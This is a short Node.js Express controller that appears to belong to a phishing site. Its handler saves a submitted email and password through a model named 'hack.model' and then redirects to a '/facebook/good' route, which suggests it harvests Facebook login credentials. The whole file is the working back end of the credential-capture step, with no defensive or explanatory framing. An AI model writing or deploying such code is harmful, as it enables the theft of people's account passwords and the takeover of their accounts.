
const bodyBarser = require("body-parser")

const hackmodel = require("../models/hack.model")


exports.addporduct = (req, res , next) =>{
        hackmodel.adduser(req.body.email , req.body.password).then(()=>{
            res.redirect('/facebook/good')
            console.log("good")
        }).catch((err)=>{
        
            console.log(err)
            res.redirect('/error')
        })
               
        }

     
 
  
    
